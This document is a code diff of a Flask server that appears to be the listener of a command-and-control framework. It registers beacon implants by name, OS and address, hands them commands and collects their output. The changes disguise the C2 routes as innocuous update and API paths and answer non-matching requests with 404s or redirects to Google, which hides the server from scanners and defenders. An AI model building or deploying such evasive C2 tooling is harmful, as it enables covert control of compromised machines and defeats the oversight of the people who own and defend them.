@@ -1,10 +1,8 @@
-from flask import Flask, request, jsonify, redirect, send_file
-import re
+from flask import Flask, request, jsonify, redirect
 import uuid
 import time
 import logging
-from Modules.global_objects import beacons, add_beacon_list, beacon_commands, config
-from werkzeug.routing import BaseConverter
+from Modules.global_objects import beacons, add_beacon_list, beacon_commands
 
 
 app = Flask(__name__)
@@ -13,61 +11,70 @@ app.logger.setLevel(logging.ERROR)
 log.setLevel(logging.ERROR)
 
 
-class RegexConverter(BaseConverter):
-    def __init__(self, map, *items):
-        super().__init__(map)
-        if items:
-            self.regex = items[0]
-        else:
-            raise ValueError("Regex pattern must be provided")
+"""
+This is used for the connection request, it requires the following parameters:
+    - part1 + part2 are random strings/ fake directories
+    - ad_param is a string that contains the word "ad"
+    - hard coded param API
+    - version is an integer between 1 and 10
+If the parameters are not met or the data is not in the correct format,
+it will return a 404
+"""
 
 
-app.url_map.converters['regex'] = RegexConverter
-@app.route('/')
-def index():
-    return send_file("html/coming_soon.html")
-
-
-@app.route('/<path:unknown_path>')
-def catch_all(unknown_path):
-    return redirect('https://www.google.com')
-
-
-@app.route(f'/<regex("{config["urlObfuscation"]["connect"]}"):custom_param>', methods=['GET'])
-def connection(custom_param):
-    if 5 <= len(custom_param) <= 10:
-        if request.args.get('name') and request.args.get('os') and request.args.get('address'):
-            name = request.args.get('name')
-            os = request.args.get('os')
-            address = request.args.get('address')
-            userID = str(uuid.uuid4())
-            add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
-            return {"timer": 5, "uuid": userID, "jitter": 10}, 200
+@app.route('/<part1>/<part2>/<ad_param>/api/v<int:version>', methods=['POST'])
+def connectionRequest(part1, part2, ad_param, version):
+    if "ad" not in ad_param or version not in range(1, 11):
+        return '', 404
+    data = request.get_json()
+    if data and 'name' in data and 'os' in data and 'address' in data:
+        name = data['name']
+        os = data['os']
+        address = data['address']
+        userID = str(uuid.uuid4())
+        add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
+        return {"timer": 5, "uuid": userID, "jitter": 10}, 200
     else:
-        return Flask.redirect("https://www.google.com", code=302)
+        return redirect("https://www.google.com", code=302)
 
 
-@app.route('/reconect', methods=['GET'])
-def reconect():
-    name = request.args.get('name')
-    os = request.args.get('os')
-    address = request.args.get('address')
-    ID = request.args.get('id')
-    timer = request.args.get('timer')
-    jitter = request.args.get('jitter')
+"""
+This is used for the reconnection request if the client looses
+connection to the server.
+It requires the following parameters:
+    - part1 is a random string/ fake directory
+    - ad_param is a string that contains the word "ad"
+    - hard coded param getLatest
+If the parameters are not met or the data is not in the correct format,
+it will return a 404
+"""
+
+
+@app.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
+def reconect(part1, ad_param):
+    if "ad" not in ad_param:
+        return '', 404
+    data = request.get_json()
+
+    name = data["name"]
+    os = data["os"]
+    address = data["address"]
+    ID = data["id"]
+    timer = data["timer"]
+    jitter = data["jitter"]
 
     if name and os and address and ID and timer and jitter:
         add_beacon_list(ID, address, name, os, time.asctime(),
                         float(timer), float(jitter))
         return {"timer": 5, "uuid": ID, "jitter": 10}, 200
     else:
-        return Flask.redirect("https://www.google.com", code=302)
+        return '', 404
 
 
-@app.route('/beacon', methods=['GET'])
-def beacon():
+@app.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
+def beacon(part1, part2):
     data = {}
-    id = request.args.get('id')
+    id = request.args.get('session')
     if not id:
         return '', 400
 
@@ -93,10 +100,12 @@ def beacon():
     return jsonify(data), 200
 
 
-@app.route('/response', methods=['POST'])
-def response():
-    cid = request.args.get('cid')
+@app.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
+def response(path1, version):
+    if version not in range(1, 11):
+        return '', 404
     output = request.get_json().get('output', '')
+    cid = request.get_json().get('command_uuid', '')
     found = False
     for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
         if cid == command_uuid:
